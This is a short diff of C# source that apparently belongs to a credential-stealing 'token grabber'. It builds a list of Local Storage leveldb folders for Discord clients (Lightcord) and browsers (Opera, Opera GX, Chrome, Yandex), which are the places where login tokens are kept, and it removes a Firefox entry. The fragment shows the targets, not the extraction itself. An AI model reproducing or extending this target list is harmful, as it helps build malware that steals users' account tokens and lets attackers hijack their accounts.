@@ -47,7 +47,6 @@ namespace Program
             locations.Add(appdata + "\\Lightcord\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\");
             locations.Add(appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\");
-            locations.Add(appdata + "\\Mozilla\\Firefox\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\");
             locations.Add(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
